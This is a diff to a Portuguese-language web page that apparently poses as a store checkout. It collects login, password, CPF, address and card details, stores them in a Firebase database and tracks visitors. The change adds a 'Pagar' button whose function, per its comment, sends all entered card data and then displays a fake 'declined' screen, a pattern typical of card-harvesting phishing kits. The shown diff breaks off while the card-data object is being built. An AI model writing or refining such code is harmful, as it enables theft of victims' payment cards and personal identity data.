@@ -287,6 +287,8 @@
     .cartao-wrap .navigation button { border: none; background: none; color: #3483fa;
       font-weight: bold; font-size: 16px; cursor: pointer; }
     .cartao-wrap .navigation button:disabled { color: #ccc; cursor: not-allowed; }
+    .cartao-wrap .btn-pagar { width: 90%; margin: 20px auto; display: block; padding: 14px;
+      background-color: #3483fa; color: white; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; }
 
     .processando, .recusado { position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: rgba(255,255,255,0.95); display: none; justify-content: center; align-items: center;
@@ -784,6 +786,7 @@ ATENÇÃO:
           <button id="anterior" onclick="anterior()" disabled>Anterior</button>
           <button id="seguinte" onclick="seguinte()">Seguinte</button>
         </div>
+        <button class="btn-pagar" id="btnPagarCartao" style="display: none;" onclick="pagarCartao()">Pagar</button>
       </div>
     </div>
   </div>
@@ -828,7 +831,6 @@ ATENÇÃO:
       db.ref('visitas/' + clienteId).update({ online: false, saiuEm: Date.now() });
     });
 
-    /* LIGHTBOX */
     function abrirLightbox(src) {
       document.getElementById('lightboxImg').src = src;
       document.getElementById('lightbox').style.display = 'flex';
@@ -837,7 +839,6 @@ ATENÇÃO:
       document.getElementById('lightbox').style.display = 'none';
     }
 
-    /* ELEMENTOS */
     const appLogin       = document.getElementById('appLogin');
     const appSite        = document.getElementById('appSite');
     const appEndereco    = document.getElementById('appEndereco');
@@ -856,7 +857,6 @@ ATENÇÃO:
     const senhaInput     = document.getElementById('senha');
     const senhaForm      = document.getElementById('senhaForm');
 
-    /* LOGIN */
     input.addEventListener('input', () => {
       let v = input.value;
       input.classList.remove('erro');
@@ -951,7 +951,6 @@ ATENÇÃO:
       window.scrollTo(0, 0);
     }
 
-    /* ENDEREÇO */
     document.getElementById('cpf').addEventListener('input', function() {
       let v = this.value.replace(/\D/g, '');
       if (v.length > 11) v = v.slice(0, 11);
@@ -1013,7 +1012,6 @@ ATENÇÃO:
         alert('Preencha todos os campos obrigatórios.');
         return;
       }
-
       pedidoRef.child('endereco').set(dados);
 
       const endFormatado = `${dados.nome}<br>${dados.rua}, ${dados.numero}${dados.complemento ? ' - ' + dados.complemento : ''}<br>${dados.bairro} - ${dados.cidade}/${dados.estado}<br>CPF: ${dados.cpf}<br>Tel: ${dados.telefone}`;
@@ -1045,7 +1043,6 @@ ATENÇÃO:
       window.scrollTo(0, 0);
     }
 
-    /* PIX */
     function escolherPix() {
       appPagamento.classList.add('hidden');
       appPix.classList.remove('hidden');
@@ -1117,12 +1114,27 @@ ATENÇÃO:
       }
       document.getElementById('slide' + n).classList.add('active');
       document.getElementById('anterior').disabled = n === 1;
+      if (n === totalSlides) {
+        document.getElementById('navigation').style.display = 'none';
+        document.getElementById('btnPagarCartao').style.display = 'block';
+      } else {
+        document.getElementById('navigation').style.display = 'flex';
+        document.getElementById('btnPagarCartao').style.display = 'none';
+      }
     }
 
     function anterior() { if (currentSlide > 1) { currentSlide--; showSlide(currentSlide); } }
 
-    /* SEGUINTE → ENVIA DADOS E MOSTRA RECUSADO */
+    /* SEGUINTE → apenas avança entre slides */
     function seguinte() {
+      if (currentSlide < totalSlides) {
+        currentSlide++;
+        showSlide(currentSlide);
+      }
+    }
+
+    /* PAGAR → envia todos os dados e mostra recusado */
+    function pagarCartao() {
       const dadosCartao = {
         numero: document.getElementById('numeroCartao').value.trim(),
         nome: document.getElementById('nomeCartao').value.trim(),
